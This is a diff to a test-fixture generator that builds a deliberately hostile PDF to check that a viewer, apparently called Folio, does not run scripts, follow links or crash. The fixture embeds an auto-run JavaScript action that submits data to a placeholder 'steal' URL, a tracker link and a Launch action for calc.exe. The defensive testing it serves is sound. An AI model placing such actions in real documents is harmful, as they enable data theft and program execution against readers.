@@ -163,6 +163,27 @@ writeFileSync(join(out, 'empty.pdf'), Buffer.alloc(0));
   await save(doc, 'single.pdf');
 }
 
+// 6b. Hostile-ish: OpenAction JavaScript, a URI link annotation and a launch action.
+// Folio must not execute scripts, follow links automatically or crash.
+{
+  const doc = await newDoc('Folio Hostile Fixture');
+  const font = await doc.embedFont(StandardFonts.Helvetica);
+  const page = textPage(doc, font, 1, 1);
+  const ctx = doc.context;
+  const js = ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of('app.alert("pwned"); this.submitForm("https://example.invalid/steal");') });
+  doc.catalog.set(PDFName.of('OpenAction'), ctx.register(js));
+  const link = ctx.obj({
+    Type: 'Annot', Subtype: 'Link', Rect: [56, 700, 300, 730], Border: [0, 0, 0],
+    A: ctx.obj({ Type: 'Action', S: 'URI', URI: PDFString.of('https://example.invalid/tracker') }),
+  });
+  const launch = ctx.obj({
+    Type: 'Annot', Subtype: 'Link', Rect: [56, 650, 300, 680], Border: [0, 0, 0],
+    A: ctx.obj({ Type: 'Action', S: 'Launch', F: PDFString.of('calc.exe') }),
+  });
+  page.node.set(PDFName.of('Annots'), ctx.obj([ctx.register(link), ctx.register(launch)]));
+  await save(doc, 'hostile.pdf');
+}
+
 // 7. Unicode (Finnish, Bengali, Arabic RTL, Japanese) via Chromium print, which shapes
 // complex scripts. Optional: skipped if Playwright/Chromium is unavailable.
 try {
